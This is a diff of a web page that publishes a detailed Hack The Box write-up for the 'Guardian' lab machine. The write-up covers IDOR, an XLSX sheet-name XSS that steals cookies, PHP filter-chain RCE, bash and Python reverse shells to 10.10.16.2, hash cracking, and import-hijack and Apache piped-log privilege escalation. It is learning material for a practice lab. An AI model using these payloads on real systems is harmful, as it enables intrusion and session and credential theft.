@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Guardian - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Guardian.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Guardian machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Guardian machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Guardian, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,308 @@
         <h1 class="writeup-title">Guardian</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">February 28, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="guardian" src="../images/Guardian/pwned.png" /></p>
-<p>Guardian is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Guardian retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Guardian/pwned.png" /></p>
+<p>Guardian was a hard-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80. The main website exposed a student portal subdomain and a testimonials section listing three student email addresses.
+A publicly accessible PDF guide for the portal revealed a default password, which I used alongside one of the discovered student emails to authenticate to the portal.</p>
+<p>Exploring the chat functionality revealed an IDOR vulnerability in the URL parameters, where chat threads were retrieved by user IDs passed directly in the request. By enumerating user IDs, I accessed a message thread between the admin and another user, recovering credentials for jamil.enockson.
+These credentials worked on a Gitea instance running on a separate subdomain, where I found the portal's source code including a composer.json file revealing a dependency on phpoffice/phpspreadsheet version 3.7.0.</p>
+<p>Investigating where the library was used in the source revealed that uploaded .docx and .xlsx attachments were converted to HTML and rendered directly on the page. I identified a known XSS vulnerability affecting phpspreadsheet versions 3.0.0 through 3.8.0, where sheet names are not sanitized during HTML conversion.
+After failing to inject the payload via openpyxl due to character restrictions, I manually edited the workbook.xml inside the unzipped XLSX file, HTML entity encoding the necessary characters, and repackaged it.
+Uploading the malicious file as an assignment attachment triggered the XSS when a lecturer viewed the submission, returning their PHPSESSID cookie. Replacing my session cookie with it granted me access as sammy.treat, a lecturer.</p>
+<p>As a lecturer, I discovered a notice creation form with a reference link field. Returning to the Gitea source code, I found an admin-only reports.php file that passed a report URL parameter directly into a PHP include statement, with only a path traversal check and a regex requiring the value to end with one of four specific filenames.
+I used a PHP filter chain to generate a webshell through a series of encoding transformations on an empty in-memory stream, which when processed by include() executed arbitrary code.
+By placing the command parameter before the report parameter in the URL, the chain URL still ended with the required filename pattern. I confirmed remote code execution as www-data by sending the payload as the reference link in a notice, triggering execution when the admin visited it.</p>
+<p>From the www-data shell, I located the database configuration in the Gitea source and connected to the MySQL instance, extracting password hashes for users with login shells. The Gitea source also revealed that passwords were hashed as SHA256 with a shared salt in the format password:salt.
+I cracked the hashes with hashcat using mode 1410 and recovered credentials for jamil.enockson, which worked for SSH access.</p>
+<p>For privilege escalation, sudo -l showed that Jamil could run a utilities.py script as Mark. The script imported several modules from a local utils directory, and the admin group, of which Jamil was a member, had write access to status.py.
+I replaced it with a Python reverse shell and triggered it via sudo, obtaining a shell as Mark.</p>
+<p>Mark could run a custom safeapache2ctl binary as root. The binary accepted a config file, and while reading the Apache documentation I discovered that the ErrorLog directive supports piped commands via the pipe character.
+Adding a bash reverse shell as the ErrorLog value and running the binary as root via sudo returned a root shell.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Guardian/nmap.png" /></p>
+<p>initial nmap scan reveals just 2 open ports. SSH on 22, and HTTP on 80.</p>
+<h2>Investigating the website</h2>
+<p><img alt="website" src="../images/Guardian/website.png" /></p>
+<p>The <code>student portal</code> button leads to a different subdomain. Aside from that, the <code>testimonials</code> button leads to an interesting part of the website.</p>
+<p><img alt="testimonials" src="../images/Guardian/testimonials.png" /></p>
+<p>The testimonials reveal 3 emails belonging to users. I will remember those, as they might come in handy sooner or later.</p>
+<pre class="codehilite"><code>Bonnie Basden | GU0142023@guardian.htb
+
+Jamesy Currin | GU6262023@guardian.htb
+
+Stephenie Vernau | GU0702025@guardian.htb
+</code></pre>
+
+<p><img alt="portal" src="../images/Guardian/portal.png" /></p>
+<p>The student portal itself requires credentials. There is a link to a PDF document, which is a guide for the portal. I'll read it right away.</p>
+<p><img alt="pdf" src="../images/Guardian/pdf.png" /></p>
+<p>The document mentions a default password of <code>GU1234</code>. Combining this with the information I already have, I will log in as one of the previous users with this default password. There is a chance that some of them set an identical password, or just did not change it.</p>
+<p><code>GU0142023 | GU1234</code></p>
+<p><img alt="studentportal" src="../images/Guardian/studentportal.png" /></p>
+<p>These credentials worked and gave me access to the student portal.</p>
+<h2>IDOR in the messages functionality</h2>
+<p><img alt="chat" src="../images/Guardian/chat.png" /></p>
+<p>Looking at the chat functionality, my user has 2 message threads active. Nothing interesting on them, though, aside from the URL itself.</p>
+<p><code>http://portal.guardian.htb/student/chat.php?chat_users[0]=13&amp;chat_users[1]=14</code></p>
+<p>This looks like it might be vulnerable to IDOR(Indirect Object Reference), as it is retrieving users via these IDs from the URL. It might be possible to read messages of other users by looking through different IDs.</p>
+<p>My user's ID is 13, <code>mireielle.feek’s</code> ID is 11. The <code>select</code> dropdown menu from the main chats screen tells us a bit more about the existing users.</p>
+<pre class="codehilite"><code># From website source (CTRL + U)
+&lt;SNIPPET&gt;
+                        &lt;select id=&quot;new-chat-user&quot; class=&quot;px-4 py-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-transparent&quot;&gt;
+                            &lt;option value=&quot;&quot;&gt;Select User&lt;/option&gt;
+                                                            &lt;option value=&quot;1&quot;&gt;admin&lt;/option&gt;
+                                                            &lt;option value=&quot;2&quot;&gt;jamil.enockson&lt;/option&gt;
+                                                            &lt;option value=&quot;3&quot;&gt;mark.pargetter&lt;/option&gt;
+                                                            &lt;option value=&quot;4&quot;&gt;valentijn.temby&lt;/option&gt;
+                                                            &lt;option value=&quot;5&quot;&gt;leyla.rippin&lt;/option&gt;
+                                                            &lt;option value=&quot;6&quot;&gt;perkin.fillon&lt;/option&gt;
+                                                            &lt;option value=&quot;7&quot;&gt;cyrus.booth&lt;/option&gt;
+                                                            &lt;option value=&quot;8&quot;&gt;sammy.treat&lt;/option&gt;
+                                                            &lt;option value=&quot;9&quot;&gt;crin.hambidge&lt;/option&gt;
+                                                            &lt;option value=&quot;10&quot;&gt;myra.galsworthy&lt;/option&gt;
+                                                            &lt;option value=&quot;12&quot;&gt;vivie.smallthwaite&lt;/option&gt;
+                                                            &lt;option value=&quot;15&quot;&gt;GU0702025&lt;/option&gt;
+                                                            &lt;option value=&quot;16&quot;&gt;GU0762023&lt;/option&gt;
+&lt;SNIPPET&gt;
+</code></pre>
+
+<p>There is a user named <code>admin</code> with the ID of 1. The users with whom my user has message threads open already are not present in the dropdown menu. Let's try to view the administrator's messages.</p>
+<p><code>http://portal.guardian.htb/student/chat.php?chat_users[0]=2&amp;chat_users[1]=1</code></p>
+<p><img alt="admin" src="../images/Guardian/admin.png" /></p>
+<p><code>jamil.enockson | DHsNnk3V503</code></p>
+<p>Apparently, there is a <code>Gitea</code> instance running on the box. I'll check it out right away with these new credentials.</p>
+<h2>Checking out the Gitea subdomain</h2>
+<p><img alt="gitea" src="../images/Guardian/gitea.png" /></p>
+<p>There is indeed a Gitea subdomain under <code>gitea.guardian.htb</code>. I will log in as Jamil, and I'll check out the repos.</p>
+<p><img alt="repos" src="../images/Guardian/repos.png" /></p>
+<p>2 repositories. I'll focus on <code>portal.gouardian.htb</code>, as it is mainly PHP.</p>
+<p><img alt="repo" src="../images/Guardian/repo.png" /></p>
+<p>Aside from a few interesting directories, there is a <code>composer.json</code> file. This JSON file is a list of all external PHP libraries and dependencies used in a project.</p>
+<pre class="codehilite"><code># Composer.json
+{
+    &quot;require&quot;: {
+        &quot;phpoffice/phpspreadsheet&quot;: &quot;3.7.0&quot;,
+        &quot;phpoffice/phpword&quot;: &quot;^1.3&quot;
+    }
+}
+</code></pre>
+
+<p><code>PhpOffice</code> is included in this project. This is a PHP component used for working with spreadsheets and Word documents, as the name suggests. I'll check where it is used throughout the source code.</p>
+<p><img alt="result" src="../images/Guardian/result.png" /></p>
+<p>The component is used in the <code>view-submission.php</code> file. From this snippet, it looks like Word documents sent as attachments to a submission will be converted to HTML and displayed back onto the page directly.</p>
+<p><img alt="snippet" src="../images/Guardian/snippet.png" /></p>
+<p>The same is the case for spreadsheets. Any .docx and .xlsx files sent will undergo this process. This screams <code>Cross-Site Scripting</code> to me, so let's look online to see whether there are any known CVEs related to phpoffice before experimenting.</p>
+<h2>XSS via malicious XLSX file upload</h2>
+<p><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a></p>
+<p>I found a GitHub advisory describing an XSS vulnerability affecting phpspreadsheets versions 3.0.0 through 3.8.0. I can trigger the XSS flaw by creating an XLSX file with multiple sheets, due to the lack of sanitization of the sheet names.</p>
+<p>I'll use the <code>openpyxl</code> library to generate an XLSX file.</p>
+<pre class="codehilite"><code># expdoc.py
+
+from openpyxl import Workbook
+
+wb = Workbook()
+
+ws = wb.active
+
+ws1 = wb.create_sheet(&quot;test&quot;)
+
+ws1.title = &quot;&lt;script&gt;eval(atob('PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEwLjEwLjE2LjI6ODAwMC9YU1NTP2M9Jytkb2N1bWVudC5jb29raWU8L3NjcmlwdD4K'))&quot;
+
+wb.save(&quot;malicious.xlsx&quot;)
+
+print(wb.sheetnames)
+</code></pre>
+
+<p>I wanted to use a b64 payload because openpyxl, just like LibreOffice, doesn't just allow certain characters (like '/', ':', and a few more) in the sheet name. However, this payload failed to bring results.</p>
+<p>Instead, I decided to take apart the .xlsx file and add the payload manually. An XLSX file can be unzipped just like an archive.</p>
+<p><img alt="tree" src="../images/Guardian/tree.png" /></p>
+<pre class="codehilite"><code># workbook.xml
+
+&lt;workbook xmlns=&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;&gt;&lt;workbookPr/&gt;&lt;workbookProtection/&gt;&lt;bookViews&gt;&lt;workbookView visibility=&quot;visible&quot; minimized=&quot;0&quot; showHorizontalScroll=&quot;1&quot; showVerticalScroll=&quot;1&quot; showSheetTabs=&quot;1&quot; tabRatio=&quot;600&quot; firstSheet=&quot;0&quot; activeTab=&quot;0&quot; autoFilterDateGrouping=&quot;1&quot;/&gt;&lt;/bookViews&gt;&lt;sheets&gt;&lt;sheet xmlns:r=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot; name=&quot;Sheet&quot; sheetId=&quot;1&quot; state=&quot;visible&quot; r:id=&quot;rId1&quot;/&gt;&lt;sheet xmlns:r=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot; name=&quot;&amp;lt;script&amp;gt;document.location=&amp;quot;http://10.10.16.2:8000/XSS?c=&amp;quot;+document.cookie&amp;lt;/script&amp;gt;&quot; sheetId=&quot;2&quot; state=&quot;visible&quot; r:id=&quot;rId2&quot;/&gt;&lt;/sheets&gt;&lt;definedNames/&gt;&lt;calcPr calcId=&quot;124519&quot; fullCalcOnLoad=&quot;1&quot;/&gt;&lt;/workbook&gt;
+</code></pre>
+
+<p>In the name field of sheet2, I added the XSS payload wrapped in script tags. Certain characters (in this case, double-quotes'" = &quot;', greater/less than signs "&gt;&lt; = &gt; and &lt;") had to be HTML entity encoded to not cause issues. The above workbook.xml showcases the result.</p>
+<p>After adding the malicious XSS payload, everything can be zipped back up with <code>zip -r ../exp.xlsx [Content_Types].xml .</code>. Adding the Content Types.xml file into the command like this will allow <code>file</code> to recognize it as a proper sheet file.</p>
+<p>As for where the file will be uploaded, it'll be an attachment to the only ongoing assignment in the assignments tab.</p>
+<p><img alt="uplo" src="../images/Guardian/uplo.png" /></p>
+<p>I sent the assignment after starting up my listener and waited for a hit.</p>
+<p><img alt="cookies" src="../images/Guardian/cookies.png" /></p>
+<p>A cookie came back! I'll see whose cookie this is by replacing mine with it (CTRL + SHIT +I -&gt; Storage, then replace the PHPSESSID cookie value)</p>
+<p><img alt="lecturer" src="../images/Guardian/lecturer.png" /></p>
+<p>We've successfully gained a PHPSESSID cookie of <code>sammy.treat</code>, a lecturer.</p>
+<h2>Exploiting the reference notice creation form</h2>
+<p><img alt="create" src="../images/Guardian/create.png" /></p>
+<p>As a lecturer, I can create notices for the notice board. I'll investigate this new endpoint.</p>
+<p><img alt="link" src="../images/Guardian/link.png" /></p>
+<p>This button led me to the <code>create.php</code> file, and the reference link's hint immediately rings a bell for possible XSS or some sort of code execution. The field requires a URL, though, which makes this a bit more complicated.</p>
+<h3>Checking the newly found files on Gitea</h3>
+<p>I returned to Gitea to look for an idea as to how I could exploit the reference link. I focused on the admin directory, thinking I could send the admin somewhere more favorable, where there was an opportunity to exploit something other than XSS.</p>
+<pre class="codehilite"><code># reports.php
+
+&lt;?php
+require '../includes/auth.php';
+require '../config/db.php';
+
+if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
+    header('Location: /login.php');
+    exit();
+}
+
+$report = $_GET['report'] ?? 'reports/academic.php';
+
+if (strpos($report, '..') !== false) {
+    die(&quot;&lt;h2&gt;Malicious request blocked 🚫 &lt;/h2&gt;&quot;);
+}   
+
+if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
+    die(&quot;&lt;h2&gt;Access denied. Invalid file 🚫&lt;/h2&gt;&quot;);
+}
+
+?&gt;
+&lt;SNIP&gt;
+
+            &lt;?php include($report); ?&gt;
+&lt;SNIP&gt;
+</code></pre>
+
+<p>Aside from revealing where the database config is, this piece of code gives me a great idea for exploitation. The <code>report</code> parameter is taken directly from the URL parameter and later passed into an include statement. It must end with one of the words mentioned in the preg_match, though, otherwise it will be refused.</p>
+<p>The include expression includes and evaluates the specified value, and if a specially-crafted payload is passed into it, it can be leveraged and used for code execution. A particular trick haunting both include and require statements exists, which I'll link below.</p>
+<p><a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it</a></p>
+<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<h2>RCE via PHP filter chain trick</h2>
+<p>The key idea is that using the provided tool, I will create a PHP filter chain that generates a small webshell through a series of encoding transformations applied to an empty in-memory stream (php://temp). When include() processes the chain, it evaluates the resulting PHP code directly, giving me code execution through the $_GET[0] parameter."</p>
+<p><code>python php_filter_chain_generator.py  --chain '&lt;?=</code>$_GET[0]<code>?&gt;'</code></p>
+<p>There is one more issue left, though, as the whole URL has to end with one of <code>(enrollment|academic|financial|system)\.php</code>. Order of parameters in the URL does not matter for PHP's <code>$_GET</code>, so I can just put the webshell payload at the beginning, so that the URL ends with the necessary .php file.</p>
+<p><code>/admin/reports.php?0=curl+http://10.10.16.2:8000/$(whoami)&amp;report=php://filter/&lt;CHAIN&gt;/resource=php://temp/academic.php</code></p>
+<p>After standing up a Python server, I sent the large reference link with the notice and waited for a few seconds.</p>
+<p><img alt="codeexec" src="../images/Guardian/codeexec.png" /></p>
+<p>Success! The underlying user is <code>www-data</code>, which is not surprising. Now I'll replace the curl command with an actual RCE payload.</p>
+<p><code>http://portal.guardian.htb/admin/reports.php?0=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.2%2F9001%200%3E%261%27&amp;report=php://filter/&lt;FILTER_CHAIN&gt;/resource=php://temp/academic.php</code></p>
+<p><img alt="shell" src="../images/Guardian/shell.png" /></p>
+<h2>Shell as www-data</h2>
+<p>I know where the <code>config.php</code> and <code>db.php</code> files lie, thanks to my earlier recon in the Gitea instance.</p>
+<p><img alt="databaseconf" src="../images/Guardian/databaseconf.png" /></p>
+<p>There is a salt as well, which is important to remember. With database credentials, I will now explore the GuardianDB database.</p>
+<p><code>mysql -h localhost -u root -pGu4rd14n_un1_1s_th3_b3st -D guardiandb -e "show tables;select * from users;"</code></p>
+<p><img alt="database" src="../images/Guardian/database.png" /></p>
+<p>There are a lot of users in this DB. I'll narrow this down to the most important targets, those who have a login shell.</p>
+<p><code>cat /etc/passwd | grep "/bin/bash"</code></p>
+<p><img alt="passwd" src="../images/Guardian/passwd.png" /></p>
+<p>There are 4 users with proper login shells, not counting root. I'll grab certain fields from the DB, targeted towards these 4 users.</p>
+<p><code>mysql -h localhost -u root -pGu4rd14n_un1_1s_th3_b3st -D guardiandb -e "SELECT username,password_hash,user_role FROM users WHERE username IN ('sammy.treat', 'mark.pargetter', 'jamil.enockson', 'gitea');"</code></p>
+<p><img alt="users" src="../images/Guardian/users.png" /></p>
+<p>These 3 users both have a shell on the box and are present in the database. I will grab these hashes, and I'll load them into John the Ripper, remembering that the passwords might be salted. For clarification, these look like SHA256 hashes.</p>
+<h3>Cracking the salted hashes</h3>
+<p>Actually, before trying to crack blindly, I will search the Gitea repo for the word "salt". It <em>could</em> show me how the salt is used, whether it is prepended to the password, or sitting at the end.</p>
+<p><img alt="config" src="../images/Guardian/config.png" /></p>
+<p>As I thought, these are SHA256 hashes, and the format is <code>$password.$salt</code>. I will return to my host, and I'll use hashcat to try to crack these hashes.</p>
+<pre class="codehilite"><code># hashes
+c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
+8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
+c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
+</code></pre>
+
+<p><code>hashcat -m 1410 hashes rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/Guardian/cracked.png" /></p>
+<p><code>jamil.enockson | copperhouse56</code></p>
+<p>I'll try to SSH into the box as Jamil with these credentials.</p>
+<p><img alt="user" src="../images/Guardian/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/Guardian/sudol.png" /></p>
+<p>Jamil can run <code>/opt/scripts/utilities/utilities.py</code> as Mark. Let's take a look at that Python script.</p>
+<h2>Python import hijack by overwriting an imported script</h2>
+<pre class="codehilite"><code># utilities.py
+#!/usr/bin/env python3
+
+import argparse
+import getpass
+import sys
+
+from utils import db
+from utils import attachments
+from utils import logs
+from utils import status
+
+
+def main():
+    parser = argparse.ArgumentParser(description=&quot;University Server Utilities Toolkit&quot;)
+    parser.add_argument(&quot;action&quot;, choices=[
+        &quot;backup-db&quot;,
+        &quot;zip-attachments&quot;,
+        &quot;collect-logs&quot;,
+        &quot;system-status&quot;
+    ], help=&quot;Action to perform&quot;)
+
+    args = parser.parse_args()
+    user = getpass.getuser()
+
+    if args.action == &quot;backup-db&quot;:
+        if user != &quot;mark&quot;:
+            print(&quot;Access denied.&quot;)
+            sys.exit(1)
+        db.backup_database()
+    elif args.action == &quot;zip-attachments&quot;:
+        if user != &quot;mark&quot;:
+            print(&quot;Access denied.&quot;)
+            sys.exit(1)
+        attachments.zip_attachments()
+    elif args.action == &quot;collect-logs&quot;:
+        if user != &quot;mark&quot;:
+            print(&quot;Access denied.&quot;)
+            sys.exit(1)
+        logs.collect_logs()
+    elif args.action == &quot;system-status&quot;:
+        status.system_status()
+    else:
+        print(&quot;Unknown action.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+<p>It imports a bunch of things from <code>utils</code>, looking into that directory reveals an interesting detail.</p>
+<p><img alt="write" src="../images/Guardian/write.png" /></p>
+<p>The admin group has read rights over the imported scripts, as well as write rights over the status.py script. Jamil is a member of that group, so let's replace it with a Python reverse shell.</p>
+<pre class="codehilite"><code>import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.16.2&quot;,9001))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])
+</code></pre>
+
+<p><code>sudo -u mark /opt/scripts/utilities/utilities.py</code></p>
+<p><img alt="hijack" src="../images/Guardian/hijack.png" /></p>
+<h2>Apache piped logs privilege escalation</h2>
+<p>Mark can run this <code>safeapache2ctl</code> binary as root. I couldn't find any information about this binary online, so I'll assume that it is a custom one. I'll try running it to see what it does.</p>
+<p><img alt="conf" src="../images/Guardian/conf.png" /></p>
+<p>It requires a config file, so I'll create a dummy one.</p>
+<p><img alt="apache" src="../images/Guardian/apache.png" /></p>
+<p>I'll need to include an MPM(Multi-Processing-Module) module. I will just create a simple, valid config for now.</p>
+<pre class="codehilite"><code>ServerRoot /tmp
+LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
+Listen 8080
+ServerName localhost
+DocumentRoot /tmp
+</code></pre>
+
+<p><img alt="error" src="../images/Guardian/error.png" /></p>
+<p>While reading the Apache docs, specifically the <code>ErrorLog</code> directive part, I found a very interesting piece of information.</p>
+<p><img alt="piped" src="../images/Guardian/piped.png" /></p>
+<p>I can spawn commands by using the pipe character, and I don't see any limitations mentioned. I will try adding a reverse shell command to the ErrorLog directive, as shown in the docs.</p>
+<p><code>ErrorLog "|/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1"</code></p>
+<p><img alt="root" src="../images/Guardian/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +379,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
